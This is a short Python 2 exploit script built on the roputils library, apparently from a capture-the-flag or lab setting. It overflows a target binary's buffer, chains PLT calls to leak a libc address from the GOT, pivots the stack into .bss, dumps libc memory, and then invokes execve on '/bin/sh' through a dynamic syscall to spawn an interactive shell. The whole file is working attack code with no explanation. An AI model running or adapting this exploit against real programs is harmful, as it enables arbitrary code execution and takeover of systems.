from roputils import *

fpath = sys.argv[1]
offset = int(sys.argv[2])

rop = ROP(fpath)
addr_stage = rop.section('.bss') + 0x400

buf = rop.fill(offset)
buf += rop.call_chain_plt(
    ['write', 1, rop.got('__libc_start_main'), 8],
    ['read', 0, addr_stage, 400]
, pivot=addr_stage)

p = Proc(rop.fpath)
p.write(p32(len(buf)) + buf)
print "[+] read: %r" % p.read(len(buf))
ref_addr = p.read_p64()

buf = rop.call_chain_plt(
    ['write', 1, ref_addr, 0x200000],
    ['read', 0, addr_stage-200, 200]
, pivot=addr_stage-200)
buf += rop.fill(400, buf)

p.write(buf)
data = p.read(0x200000)

buf = rop.dynamic_syscall(ref_addr, data, 59, addr_stage-112, addr_stage-128, 0)
print "[+] offset to argv: %d" % (len(buf)-200)
buf += p64(addr_stage-112)
buf += p64(0)
buf += rop.string('/bin/sh')
buf += rop.fill(200, buf)

p.write(buf)
p.interact()
